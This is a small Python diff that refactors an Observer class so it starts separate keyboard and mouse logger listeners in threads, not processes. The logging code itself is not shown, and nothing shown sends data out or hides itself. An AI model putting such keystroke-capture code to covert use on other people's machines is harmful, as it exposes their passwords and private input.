@@ -1,25 +1,18 @@
-import multiprocessing
-
-from pynput.keyboard import Listener as KeyListener
-from pynput.mouse import Listener as MouseListener
+from multiprocessing import Process
+from threading import Thread
 
 from Loggers.KeyLogger import KeyLogger
 from Loggers.MouseLogger import MouseLogger
 
 class Observer():
     
-    def __init__(self):
-        pass
-    
-    def activate_listeners(self):
-        mouse_logger = MouseLogger()
-        key_logger = KeyLogger()
+    def activate_listeners(self):        
+        thread_mouse = Thread(target=MouseLogger().mouse_listener)
+        thread_key = Thread(target=KeyLogger().keyboard_listener)
         
-        process_mouse = multiprocessing.Process(target=mouse_logger.mouse_listener)
-        process_key = multiprocessing.Process(target=key_logger.keyboard_listener)
+        thread_mouse.start()
+        thread_key.start()
         
-        process_mouse.start()
-        process_key.start()
+        thread_mouse.join()
+        thread_key.join()
         
-        process_mouse.join()
-        process_key.join()
